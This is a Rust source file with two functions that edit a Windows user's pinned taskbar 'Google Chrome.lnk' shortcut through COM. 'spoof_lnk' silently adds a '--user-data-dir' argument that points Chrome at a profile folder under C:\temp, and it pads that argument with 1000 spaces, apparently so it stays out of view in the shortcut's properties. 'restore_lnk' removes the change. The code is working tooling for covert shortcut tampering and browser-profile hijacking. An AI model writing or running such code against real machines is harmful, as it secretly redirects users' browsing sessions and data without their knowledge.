use windows::{
    core::{Interface, PCWSTR},
    Win32::{
        System::Com::{
            CoCreateInstance, CoInitializeEx, CoUninitialize, CLSCTX_INPROC_SERVER, COINIT_APARTMENTTHREADED, IPersistFile,
        },
        UI::Shell::{IShellLinkW, ShellLink},
    },
};
use widestring::U16CString;

pub fn spoof_lnk(username: &str) -> Result<(), Box<dyn std::error::Error>> {
    let shortcut_path = format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username);
    let target_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
    let arguments = format!("{}--user-data-dir=\"C:\\temp\\{}\"", " ".repeat(1000), username);

    unsafe {
        CoInitializeEx(None, COINIT_APARTMENTTHREADED).ok()?;
        let shell_link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER)?;

        let target_path_wide = U16CString::from_str(target_path).unwrap();
        shell_link.SetPath(PCWSTR(target_path_wide.as_ptr()))?;

        let args_wide = U16CString::from_str(&arguments).unwrap();
        shell_link.SetArguments(PCWSTR(args_wide.as_ptr()))?;

        let persist_file: IPersistFile = shell_link.cast()?;

        let link_path_wide = U16CString::from_str(&shortcut_path).unwrap();
        persist_file.Save(PCWSTR(link_path_wide.as_ptr()), true)?;

        CoUninitialize();
    }

    Ok(())
}

pub fn restore_lnk(username: &str) -> Result<(), Box<dyn std::error::Error>> {
    let shortcut_path = format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username);
    let target_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

    unsafe {
        CoInitializeEx(None, COINIT_APARTMENTTHREADED).ok()?;
        let shell_link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER)?;

        let target_path_wide = U16CString::from_str(target_path).unwrap();
        shell_link.SetPath(PCWSTR(target_path_wide.as_ptr()))?;

        let empty_args_wide = U16CString::from_str("").unwrap();
        shell_link.SetArguments(PCWSTR(empty_args_wide.as_ptr()))?;

        let persist_file: IPersistFile = shell_link.cast()?;

        let link_path_wide = U16CString::from_str(&shortcut_path).unwrap();
        persist_file.Save(PCWSTR(link_path_wide.as_ptr()), true)?;

        CoUninitialize();
    }

    Ok(())
}
